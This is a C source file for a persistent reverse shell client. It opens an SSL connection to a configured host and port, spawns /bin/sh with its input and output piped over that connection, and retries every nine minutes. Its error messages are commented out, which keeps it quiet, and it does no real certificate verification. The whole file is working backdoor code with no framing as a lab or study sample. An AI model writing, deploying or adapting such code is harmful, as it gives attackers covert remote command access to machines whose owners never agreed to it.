#include <stdio.h>
#include <memory.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/wait.h>

#include <openssl/crypto.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include <pthread.h>


#define CHK_NULL(x) if ((x)==NULL) exit (1)
#define CHK_ERR(err,s) if ((err)==-1) { perror(s); exit(1); }
#define CHK_SSL(err) if ((err)==-1) { ERR_print_errors_fp(stderr); exit(2); }

#define TRUE 1
#define FALSE 0

int pipeIn[2];
int pipeOut[2];
int connectAlive = FALSE;
pid_t childPID;
int SIZE = 2048;
//const char* message="Welcome!\n";

void* InputThread(void* praga);
void* OutputThread(void* praga);

struct resource
{
	char domain[100];
	short port;
	char program[100];
	char shell[100];
};

struct resource serverRes = {"localhost",4443,"/bin/sh","/bin/sh"};

int main ()
{
  int err=0;
  int sd;
  int status;
  pthread_t InputThreadTID;
  pthread_t OutputThreadTID;
  pid_t pid;

  struct sockaddr_in sa;
  struct hostent* ht=NULL;
  SSL_CTX* ctx;
  SSL*     ssl;
  X509*    server_cert;
  char*    str;
  char     buf [4096];
  const SSL_METHOD *meth;

  SSLeay_add_ssl_algorithms();
  meth = SSLv23_client_method();
  SSL_load_error_strings();


while(1)
{
  /* ----------------------------------------------- */
  /* Create a socket and connect to server using normal socket calls. */


  ht = gethostbyname(serverRes.domain);
  if(!ht)
  {
	//printf("gethostbyname Error");
	goto Next;
  }	

  sd = socket (AF_INET, SOCK_STREAM, 0);      // CHK_ERR(sd, "socket");
  if( -1 == sd)
  {
	//printf("create socket Error.\n");
	goto Next;
  }

 
  memset (&sa, '\0', sizeof(sa));
  sa.sin_family      = AF_INET;
  sa.sin_addr.s_addr =  (*(unsigned int*)ht->h_addr_list[0]);   /* Server IP */
  sa.sin_port        = htons     (serverRes.port);          /* Server Port number */
  
  if( -1 == connect(sd, (struct sockaddr*) &sa,sizeof(sa)))
  {
	//printf("Connect Error.\n");
	goto Next;
  }

  /* ----------------------------------------------- */
  /* Now we have TCP conncetion. Start SSL negotiation. */
  
  ctx = SSL_CTX_new (meth);                      //  CHK_NULL(ctx);
  if(ctx == NULL || err == -1)
  {
	close(sd);
	goto Next;
  }
  
  ssl = SSL_new (ctx);                         //CHK_NULL(ssl);    
  SSL_set_fd (ssl, sd);
  err = SSL_connect (ssl);                     //CHK_SSL(err);
  if(-1 == err )
  {
	//printf("SSL_connect Error.\n");
	goto sslClose;
  }
    
  /* Following two steps are optional and not required for
     data exchange to be successful. */
  
  /* Get the cipher - opt */

  //printf ("SSL connection using %s\n", SSL_get_cipher (ssl));
  
  /* Get server's certificate (note: beware of dynamic allocation) - opt */

  server_cert = SSL_get_peer_certificate (ssl);       //CHK_NULL(server_cert);
  if(server_cert == NULL)
  {
  	//printf ("Server certificate:\n");
	goto sslClose;
  }
  
  str = X509_NAME_oneline (X509_get_subject_name (server_cert),0,0);
  //CHK_NULL(str);
  if(NULL == str)
  {
	//printf("X509_NAME_online subject Error.\n");
	goto sslClose;

  }
  //printf ("\t subject: %s\n", str);
  OPENSSL_free (str);

  str = X509_NAME_oneline (X509_get_issuer_name  (server_cert),0,0);
  //CHK_NULL(str);
  if(NULL == str)
  {
	//printf("X509_NAME_online issue Error.\n");
	goto sslClose;
  }
  //printf ("\t issuer: %s\n", str);
  OPENSSL_free (str);

  /* We could do all sorts of certificate verification stuff here before
     deallocating the certificate. */

  X509_free (server_cert);
  
  connectAlive = TRUE;

  /* --------------------------------------------------- */
  /* DATA EXCHANGE - Send a message and receive a reply. */

  //create pipe..pipe[0] - for read;pipe[1] - for write
  if( -1 == pipe(pipeIn))
  {
	close(sd);
	goto sslClose;
  }

  if( -1 == pipe(pipeOut))
  {
	close(sd);
	goto sslClose;
  }  

  pid = fork();
  if(pid == 0)
  {//child process
	dup2(pipeIn[0],STDIN_FILENO);
	dup2(pipeOut[1],STDOUT_FILENO);
	dup2(pipeOut[1],STDERR_FILENO);

	execl(serverRes.shell,serverRes.program,(char*)0);
	exit(0);
  }
  else if(pid>0)
  {//parent process

	childPID = pid;

	//create two thread(for op pipes)
	pthread_create(&InputThreadTID,NULL,InputThread,ssl);
	pthread_create(&OutputThreadTID,NULL,OutputThread,ssl);

	//printf("wait for child process.\n");

	//welcome message
	//SSL_write(ssl,message,strlen(message));

	waitpid(pid,&status,0);
 
	connectAlive = FALSE;

        //printf("child process Exit.\n");

	close(pipeIn[0]);
	close(pipeIn[1]);
	close(pipeOut[0]);
	close(pipeOut[1]);

        sleep(5);//wait for threads exit
  }
  else
  {
	//printf("fork Error.\n");
	goto sslClose;
  }



/*
  err = SSL_write (ssl, "Hello World!", strlen("Hello World!"));  CHK_SSL(err);
  
  err = SSL_read (ssl, buf, sizeof(buf) - 1);                     CHK_SSL(err);
  buf[err] = '\0';
  printf ("Got %d chars:'%s'\n", err, buf);
*/

 //printf("do clean up\n");
 //printf("before sslClose.\n");

sslClose:
  //SSL_shutdown (ssl);  /* send SSL/TLS close_notify */ //do'nt use SSL_shutdown

  //printf("SSL_shutdown.\n");
  /* Clean up. */

  close (sd);
  SSL_free (ssl);
  SSL_CTX_free (ctx);

  //printf("free.\n");

Next:
  sleep(9*60);
}

  return 0;
}
/* EOF - cli.cpp */


void* InputThread(void* praga)
{
  SSL* ssl = (SSL*)praga;
  int err;
  int bytes; 

  char* buffer = (char*)malloc(SIZE);

  //printf("InputThread Start.\n");

  while(connectAlive)
  {
	bytes = SSL_read(ssl,buffer,SIZE); err = bytes;
	if(err == -1)
	{
		connectAlive = FALSE;
		break;
	}

	if( bytes > 0)
		write(pipeIn[1],buffer,bytes);
  }

  free(buffer);

  kill(childPID,SIGKILL);

  //printf("InputThread Exit.\n");

}

void* OutputThread(void* praga)
{
  SSL* ssl = (SSL*)praga;
  int err;
  int bytes;
  
  char* buffer = (char*)malloc(SIZE);

  //printf("OutputThread Start.\n");

  while(connectAlive)
  {
	bytes = read(pipeOut[0],buffer,SIZE);

	if(bytes > 0)
	{
		err = SSL_write(ssl,buffer,bytes);
		if(err == -1)
		{
			connectAlive = FALSE;
			break;
		}

	}

  }

  free(buffer);

  //printf("OutputThread Exit.\n");

}
